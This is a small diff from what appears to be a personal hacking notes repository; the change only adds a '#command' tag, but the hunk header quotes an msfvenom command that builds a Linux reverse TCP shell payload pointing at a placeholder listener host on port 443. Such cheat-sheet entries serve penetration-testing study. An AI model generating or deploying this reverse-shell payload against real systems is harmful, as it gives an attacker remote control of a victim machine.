@@ -8,4 +8,4 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f elf > rev_shel
 - ~/kb/hacking/commands/msfvenom-commands.md
 
 Tags:
-    #assorted
+    #assorted #command
